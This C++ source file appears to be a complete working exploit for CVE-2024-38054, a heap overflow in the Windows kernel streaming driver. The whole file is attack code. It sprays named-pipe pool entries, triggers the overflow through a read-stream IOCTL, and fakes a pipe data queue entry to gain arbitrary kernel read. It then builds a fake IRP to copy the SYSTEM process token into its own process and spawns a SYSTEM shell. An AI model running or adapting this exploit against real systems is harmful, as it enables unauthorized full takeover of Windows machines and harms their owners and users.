// exploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "cve-2024-38054.hpp"
#include "cve-2024-38054-hex.hpp"

#include <Ks.h>
#include <Ksmedia.h>
#include <Cfgmgr32.h>

#pragma comment(lib, "ksuser.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Cfgmgr32.lib")

#define TEE_INTERFACE "\\\\?\\root#system#0000#{cf1dda2c-9743-11d0-a3ee-00a0c9223196}\\{cfd669f1-9bc2-11d0-8299-0000f822fe8a}&{cf1dda2c-9743-11d0-a3ee-00a0c9223196}"

#define KS_HEADER_SIZE (sizeof(KSSTREAM_HEADER) + sizeof(KS_FRAME_INFO) + sizeof(KSSTREAM_METADATA_INFO))
#define TARGET_CHUNK_SIZE 0x4000
#define VULN_CHUNK_SIZE (TARGET_CHUNK_SIZE - 0x10 - 8 * 2) 

#define NP_HEADER_SIZE 0x30
#define FIRST_ENTRY_SIZE (0x2000-NP_HEADER_SIZE) //FIRST_ENTRY is not very important
#define SECOND_ENTRY_SIZE (TARGET_CHUNK_SIZE-NP_HEADER_SIZE)
#define THIRD_ENTRY_SIZE (0x1000-NP_HEADER_SIZE)

#define TOTAL_DATA_SIZE (FIRST_ENTRY_SIZE + SECOND_ENTRY_SIZE + THIRD_ENTRY_SIZE)

#define VULN_HEADER_SIZE 0x97   // KS_HEADER_SIZE: 16 byte overflow --> 0x97 = KS_HEADER_SIZE + 15, limit to 1 byte overflow
#define FRAME_SIZE 100
#define VULN_HEADER_PAD (VULN_CHUNK_SIZE - VULN_HEADER_SIZE)    // Total VULN_CHUNK_SIZE will round up to page align anyway

#define NAME_PIPE_SPRAY_COUNT 2000
#define NAME_PIPE_HOLE_COUNT 10

#define EPROCESS_THREADLISTHEAD_OFFSET 0x5e0
#define EPROCESS_PID_OFFSET 0x440
#define EPROCESS_TOKEN_OFFSET 0x4b8
#define EPROCESS_PROCESSLINK_OFFSET 0x448

PIPE_HANDLES g_vulnPipe;
DATA_QUEUE_ENTRY* g_usermodeDqe;

DWORD WINAPI ThreadedWriter(void* arg) {
    // Create an extra entry, making the pipe quota exceed to declared amount
    char* buf = (char*)arg;
    DWORD res;
    WriteFile(g_vulnPipe.Write, buf, FIRST_ENTRY_SIZE, &res, NULL);
    Sleep(-1);
    return 0;
}


void arbitraryRead(PVOID64 addr, size_t size, PVOID result) {
    //printf("[*] Reading: 0x%I64x\n", addr);
    if (!g_vulnPipe.Read) {
        puts("[!] No corrupted pipe");
        return;
    }

    *(PVOID64*)((char*)g_usermodeDqe->Irp + 0x18) = addr; // SystemBuffer
    g_usermodeDqe->SecurityContext = 0;
    g_usermodeDqe->EntryType = 1;
    g_usermodeDqe->QuotaInEntry = 0;
    g_usermodeDqe->DataSize = size;
    size_t bufSize = TOTAL_DATA_SIZE + 1 + size;
    char* tempBuf = (char*)malloc(bufSize);

    PeekNamedPipe(g_vulnPipe.Read, tempBuf, bufSize, NULL, NULL, NULL);
    memcpy(result, &tempBuf[bufSize - size], size);
    //std::cout << Hexdump(result, size) << std::endl;
    free(tempBuf);
}

void initFakeDataQueueEntry() {
    g_usermodeDqe = (DATA_QUEUE_ENTRY*)VirtualAlloc(NULL, sizeof(DATA_QUEUE_ENTRY), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    IRP* irp = (IRP*)VirtualAlloc(NULL, sizeof(IRP), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    printf("[*] Fake DATA_QUEUE_ENTRY at: 0x%p\n", g_usermodeDqe);
    printf("[*] Usermode IRP at: 0x%p\n", irp);
    memset(g_usermodeDqe, 0, sizeof(DATA_QUEUE_ENTRY));
    g_usermodeDqe->Irp = irp;
    g_usermodeDqe->SecurityContext = 0;
    g_usermodeDqe->EntryType = 1;
    g_usermodeDqe->QuotaInEntry = 0;
    g_usermodeDqe->DataSize = 0x100;  // will be fixed later when arbitrary read
}

uint64_t findEProcessById(uint64_t eProc, uint64_t targetPid) {
    // eProc is a known address of an EPROCESS
    uint64_t currentEProc, currentPid;
    currentEProc = eProc;
    while (true) {
        arbitraryRead((PVOID64)(currentEProc + EPROCESS_PID_OFFSET), 8, &currentPid);
        if (currentPid == targetPid) {
            return currentEProc;
        }
        arbitraryRead((PVOID64)(currentEProc + EPROCESS_PROCESSLINK_OFFSET), 8, &currentEProc);
        currentEProc -= EPROCESS_PROCESSLINK_OFFSET;
        if (currentEProc == eProc) {
            return 0;
        }
    }
}

void prepareWriteIRP(uint64_t irp, uint64_t thread_list, uint64_t source_address, uint64_t destination_address) {
    *(ULONG*)(irp + 0x10) = 0x60850;
    *(uint64_t*)(irp + 0x18) = source_address;
    *(uint64_t*)(irp + 0x70) = destination_address;
    *(uint64_t*)(irp + 0x20) = thread_list;
    *(uint64_t*)(irp + 0x28) = thread_list;
}

void prepareDataEntryForWrite(uint64_t irp, uint32_t size) {
    g_usermodeDqe->EntryType = 0;
    g_usermodeDqe->DataSize = size;
    g_usermodeDqe->QuotaInEntry = size - 1;
    g_usermodeDqe->Irp = (IRP* __ptr64)irp;
}

int main() {
    NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");

    puts("[*] Creating pin");
    HANDLE hDevice = CreateFileA(TEE_INTERFACE, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    PKSPIN_CONNECT ksPinConn = (PKSPIN_CONNECT)malloc(sizeof(KSPIN_CONNECT) + sizeof(KSDATAFORMAT));
    ksPinConn->Interface.Set = KSINTERFACESETID_Standard;
    ksPinConn->Interface.Id = KSINTERFACE_STANDARD_STREAMING;
    ksPinConn->Interface.Flags = 0;

    ksPinConn->Medium.Set = KSMEDIUMSETID_Standard;
    ksPinConn->Medium.Id = KSMEDIUM_STANDARD_DEVIO;
    ksPinConn->Medium.Flags = 0;

    ksPinConn->PinId = 0;
    ksPinConn->PinToHandle = NULL;
    ksPinConn->Priority.PriorityClass = KSPRIORITY_NORMAL;
    ksPinConn->Priority.PrioritySubClass = KSPRIORITY_NORMAL;

    PKSDATAFORMAT ksDataFormat = (PKSDATAFORMAT)(ksPinConn + 1);
    ksDataFormat->FormatSize = sizeof(KSDATAFORMAT);
    ksDataFormat->Flags = 0;
    ksDataFormat->SampleSize = 0;
    ksDataFormat->Reserved = 0;
    ksDataFormat->MajorFormat = KSDATAFORMAT_TYPE_STREAM;
    ksDataFormat->SubFormat = KSDATAFORMAT_SUBTYPE_NONE;
    ksDataFormat->Specifier = KSDATAFORMAT_SPECIFIER_NONE;

    HANDLE connHandle;
    KsCreatePin(hDevice, ksPinConn, GENERIC_READ, &connHandle);

    puts("[*] Setting up a DQE in usermode");
    initFakeDataQueueEntry();

    puts("[*] Pool spray");
    int holePipeCounter = 0;
    char pipeContent[TOTAL_DATA_SIZE];
    memset(pipeContent, 0x42, sizeof(pipeContent));

    std::vector<PIPE_HANDLES> sprayPipeList, holePipeList;
    HANDLE r, w;
    for (int i = 0; i < NAME_PIPE_SPRAY_COUNT; i++) {
        w = CreateNamedPipeA(PIPE_NAME_1, PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, TOTAL_DATA_SIZE, 0, 0, NULL);
        r = CreateFileA(PIPE_NAME_1, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
        if (r == NULL || w == NULL) {
            puts("Failed to create pipe");
            continue;
        }
        sprayPipeList.push_back({ r, w });
    }

    for (int i = 0; i < NAME_PIPE_HOLE_COUNT; i++) {
        w = CreateNamedPipeA(PIPE_NAME_1, PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, TOTAL_DATA_SIZE, 0, 0, NULL);
        r = CreateFileA(PIPE_NAME_1, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
        if (r == NULL || w == NULL) {
            puts("Failed to create pipe");
            continue;
        }
        holePipeList.push_back({ r, w });
    }

    // Create 1st entries
    for (auto& p : sprayPipeList) {
        WriteFile(p.Write, pipeContent, FIRST_ENTRY_SIZE, NULL, NULL);
    }

    // Creating 2nd entries
    for (int i = 0; i < NAME_PIPE_SPRAY_COUNT; i++) {
        WriteFile(sprayPipeList[i].Write, pipeContent, SECOND_ENTRY_SIZE, NULL, 0);
        if (i > 900 && i < NAME_PIPE_SPRAY_COUNT - 10 && i % 4 == 0 && holePipeCounter < NAME_PIPE_HOLE_COUNT) {
            WriteFile(holePipeList[holePipeCounter].Write, pipeContent, SECOND_ENTRY_SIZE, NULL, 0);
            holePipeCounter++;
        }
    }
    // Create 3rd entries
    char thirdEntryBuf[THIRD_ENTRY_SIZE];
    ZeroMemory(thirdEntryBuf, THIRD_ENTRY_SIZE);
    DATA_QUEUE_ENTRY* innerEntry = (DATA_QUEUE_ENTRY*)thirdEntryBuf;    // The fake entry inside the 3rd entry
    innerEntry->Flink = (uint64_t)g_usermodeDqe;
    innerEntry->Blink = 0;
    innerEntry->Irp = NULL;
    innerEntry->EntryType = 0;
    innerEntry->QuotaInEntry = 0;
    innerEntry->DataSize = THIRD_ENTRY_SIZE + 1;
    for (auto& p : sprayPipeList) {
        WriteFile(p.Write, thirdEntryBuf, THIRD_ENTRY_SIZE, NULL, NULL);
    }

    // Prepare payload
    KSSTREAM_HEADER* ksStreamHeader = (KSSTREAM_HEADER*)malloc(VULN_CHUNK_SIZE);
    ZeroMemory(ksStreamHeader, VULN_CHUNK_SIZE);
    ksStreamHeader->Size = VULN_HEADER_PAD;
    ksStreamHeader->FrameExtent = FRAME_SIZE;
    ksStreamHeader->Data = malloc(FRAME_SIZE);
    ksStreamHeader->OptionsFlags = 0;
    memset(ksStreamHeader + 1, 0x41, ksStreamHeader->Size - sizeof(KSSTREAM_HEADER));

    KSSTREAM_HEADER* vulnHeader = (KSSTREAM_HEADER*)((char*)ksStreamHeader + VULN_HEADER_PAD);
    vulnHeader->Size = VULN_HEADER_SIZE;
    vulnHeader->FrameExtent = FRAME_SIZE;
    vulnHeader->Data = malloc(FRAME_SIZE);
    vulnHeader->OptionsFlags = KSSTREAM_HEADER_OPTIONSF_METADATA | KSSTREAM_HEADER_OPTIONSF_FRAMEINFO | KSSTREAM_HEADER_OPTIONSF_PERSIST_SAMPLE;
    memset(vulnHeader + 1, 0x41, sizeof(KS_FRAME_INFO));

    KSSTREAM_METADATA_INFO* metadataInfo = (KSSTREAM_METADATA_INFO*)((char*)vulnHeader + sizeof(KSSTREAM_HEADER) + sizeof(KS_FRAME_INFO));
    metadataInfo->BufferSize = sizeof(DATA_QUEUE_ENTRY);
    metadataInfo->UsedSize = sizeof(DATA_QUEUE_ENTRY);
    metadataInfo->Data = g_usermodeDqe;
    metadataInfo->SystemVa = (PVOID)0x43434343;
    metadataInfo->Flags = 0x43434343;
    metadataInfo->Reserved = 0x30000000;    // The overflow byte is 0x30

    // Poke holes and trigger the vuln
    for (auto& p : holePipeList) {
        ReadFile(p.Read, pipeContent, SECOND_ENTRY_SIZE, 0, 0);
    }

    puts("[*] Triggering overflow");
    DeviceIoControl(connHandle, IOCTL_KS_READ_STREAM, ksStreamHeader, VULN_CHUNK_SIZE, ksStreamHeader, VULN_CHUNK_SIZE, NULL, NULL);
    // Detect corrupted pipe 
    for (auto& p : sprayPipeList) {
        char outOfBoundDat[TOTAL_DATA_SIZE + 1];
        DWORD byteRead;
        PeekNamedPipe(p.Read, outOfBoundDat, sizeof(outOfBoundDat), &byteRead, NULL, NULL);
        if (byteRead == TOTAL_DATA_SIZE + 1) {
            puts("[*] Found corrupted pipe");
            g_vulnPipe = { p.Read, p.Write };
        }
    }
    if (!g_vulnPipe.Read) {
        puts("[!] Can't find corrupted pipe");
        exit(1);
    }
    char outOfBoundDat[TOTAL_DATA_SIZE + 1];
    PeekNamedPipe(g_vulnPipe.Read, outOfBoundDat, sizeof(outOfBoundDat), NULL, NULL, NULL);
    DATA_QUEUE_ENTRY* _ptr64 nextChunkFlink = (DATA_QUEUE_ENTRY* _ptr64)*(uint64_t*)&outOfBoundDat[TOTAL_DATA_SIZE - 0x30];
    printf("[*] Next chunk Flink: 0x%I64x\n", nextChunkFlink);
    DATA_QUEUE_ENTRY* _ptr64 nextChunkAddr;
    arbitraryRead(&nextChunkFlink->Blink, 8, &nextChunkAddr);
    printf("[*] Next chunk address: 0x%I64x\n", nextChunkAddr);
    DATA_QUEUE_ENTRY* _ptr64 currentThirdEntry = (DATA_QUEUE_ENTRY * _ptr64)((uint64_t)nextChunkAddr - THIRD_ENTRY_SIZE - NP_HEADER_SIZE);
    printf("[*] Leaked corrupted 3rd entry: 0x%I64x\n", currentThirdEntry);
    uint64_t corruptCcbAddr;
    arbitraryRead(&currentThirdEntry->Flink, 8, &corruptCcbAddr);   // last entry, so the fwd pointer points to ccb
    printf("[*] CCB of the corrupted pipe: 0x%I64x\n", corruptCcbAddr);

    CreateThread(0, 0, ThreadedWriter, pipeContent, 0, 0); 
    Sleep(2000);

    uint64_t nextEntry, validIrpAddr;
    arbitraryRead(&currentThirdEntry->Flink, 8, &nextEntry);
    arbitraryRead((PVOID64)(nextEntry + offsetof(DATA_QUEUE_ENTRY, Irp)), 8, &validIrpAddr);
    printf("[*] Real IRP created at: 0x%I64x\n", validIrpAddr);

    char irpData[0x100];
    arbitraryRead((PVOID64)validIrpAddr, 0x100, irpData);

    uint64_t threadListHead, currentEProcess, systemEProcess;
    // Calculate _ETHREAD.ThreadListEntry from _ETHREAD.IrpList
    // IRP belongs to the last thread created, Flink points to ThreadListHead in EProcess
    arbitraryRead((PVOID64)(*(uint64_t*)(&irpData[0x20]) + 0x38), 8, &threadListHead);
    currentEProcess = threadListHead - EPROCESS_THREADLISTHEAD_OFFSET;
    printf("[*] Leaked current EPROCESS: 0x%I64x\n", currentEProcess);
    systemEProcess = findEProcessById(currentEProcess, 4);
    printf("[*] Leaked SYSTEM EPROCESS: 0x%I64x\n", systemEProcess);

    puts("[*] Crafting fake IRP");
    uint64_t thread_list[2];
    IO_STATUS_BLOCK isb;
    prepareWriteIRP((uint64_t)irpData, (uint64_t)thread_list, systemEProcess + EPROCESS_TOKEN_OFFSET, currentEProcess + EPROCESS_TOKEN_OFFSET);
    // TODO: Find out why the entry holding the fake IRP has to be unbuffered
    NtFsControlFile(g_vulnPipe.Write, 0, 0, 0, &isb, 0x119FF8, irpData, 0x1000, 0, 0);  

    uint64_t containerEntryAddr, containerIrpAddr, fakeIrpAddr;
    arbitraryRead((PVOID64)nextEntry, 8, &containerEntryAddr);  // New entry created at the end of the list
    arbitraryRead((PVOID64)(containerEntryAddr + offsetof(DATA_QUEUE_ENTRY, Irp)), 8, &containerIrpAddr);
    arbitraryRead((PVOID64)(containerIrpAddr + 0x18), 8, &fakeIrpAddr);
    printf("[*] Fake IRP at: 0x%I64x\n", fakeIrpAddr);

    prepareDataEntryForWrite(fakeIrpAddr, 8);
    thread_list[0] = thread_list[1] = fakeIrpAddr + 0x20;
    puts("[*] Trigger arbitrary write, swapping tokens");
    DWORD byteRead;
    ReadFile(g_vulnPipe.Read, pipeContent, 1, &byteRead, 0);
    Sleep(200);

    puts("[*] Done");
    system("cmd");

    getchar();

}
